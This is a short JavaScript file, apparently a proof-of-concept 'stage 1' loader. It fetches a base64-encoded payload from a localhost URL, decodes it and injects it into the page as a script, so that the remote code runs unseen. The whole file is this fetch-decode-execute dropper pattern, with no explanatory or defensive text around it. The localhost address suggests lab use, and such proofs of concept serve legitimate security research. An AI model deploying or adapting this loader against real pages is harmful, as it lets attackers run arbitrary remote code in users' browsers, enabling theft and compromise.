(function () {
  const PAYLOAD_B64_URL = "http://localhost:4000/payload.b64";

  async function run() {
    try {
      const b64 = await fetch(PAYLOAD_B64_URL, { cache: "no-store" }).then(r => r.text());

      const code = atob(b64.trim());
      
      const s = document.createElement("script");
      s.id = "pocH_stage2";
      s.setAttribute("data-poc", "H");
      s.textContent = code;
      (document.head || document.documentElement).appendChild(s);

      console.log("[loader] stage2 executed");
    } catch (e) {
      console.log("[loader] failed:", e?.message || e);
    }
  }

  run();
})();
